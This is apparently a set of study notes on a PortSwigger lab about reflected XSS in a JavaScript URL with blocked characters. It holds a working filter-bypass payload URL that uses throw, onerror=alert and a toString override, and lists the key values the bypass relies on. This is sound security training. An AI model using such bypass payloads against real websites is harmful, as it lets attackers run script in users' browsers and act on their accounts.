# Lab: Reflected XSS in a JavaScript URL with some characters blocked

**Official lab:** [https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked)

## Lab idea

The application reflects input in a JavaScript URL and blocks selected characters. The challenge practices assessing URL schemes and incomplete character filters without assuming that a blacklist guarantees safe navigation.

## Vulnerability in brief
Cross-site scripting (XSS) is a web security vulnerability in which an application causes attacker-controlled content to be interpreted as executable script in a user’s browser. The code runs in the vulnerable site’s origin, so it can interfere with the victim’s interaction with that application and may access data or perform actions available to that user.

## Solution idea
1. Visit the following URL, replacing YOUR-LAB-ID with your lab ID:
2. The lab will be solved, but the alert will only be called if you click "Back to blog" at the bottom of the page.
3. The exploit uses exception handling to call the alert function with arguments.
4. As throw is a statement, it cannot be used as an expression.

## Payloads / key values
- `YOUR-LAB-ID`
- `https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27`
- `alert`
- `throw`
- `onerror`
- `toString`
- `window`

## Official source
- [PortSwigger Academy: Lab: Reflected XSS in a JavaScript URL with some characters blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked)
